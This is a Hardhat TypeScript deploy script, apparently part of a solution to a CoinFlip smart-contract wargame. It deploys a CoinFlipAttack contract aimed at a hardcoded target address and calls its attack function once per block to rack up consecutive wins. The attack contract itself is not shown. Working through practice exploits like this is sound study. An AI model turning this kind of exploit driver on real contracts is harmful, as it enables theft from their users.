import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
// import { FileService } from "../utils";
import { CoinFlipAttack__factory } from '../../typechain-types';

const func: DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const coinFlip = "0xC4C255Bd08CbfAAF62Fbdc89aE5B124D82d83113"
    var blockNumber = 0

    console.log(">> Deploying CoinFlipAttack contract");
    const CoinFlipAttack = (await ethers.getContractFactory(
        "CoinFlipAttack",
        (await ethers.getSigners())[0])) as CoinFlipAttack__factory;
      const coinFlipAttack = await CoinFlipAttack.deploy(coinFlip);
      await coinFlipAttack.deployed();
      console.log(`>> Deployed at ${coinFlipAttack.address}`);
      console.log("✅ Done");
    async function test() {
        for(var i=0;i<10;){
            var newBlockNumber = await ethers.provider.getBlockNumber()
            if(blockNumber< newBlockNumber){
                await coinFlipAttack.attack();
                console.log(`>>Consecutive Wins ${await coinFlipAttack.consecutiveWins()}`)
                blockNumber = newBlockNumber;
                i++
            }
        }
    }
    await test();
}

export default func;
func.tags = ['CoinFlipAttack'];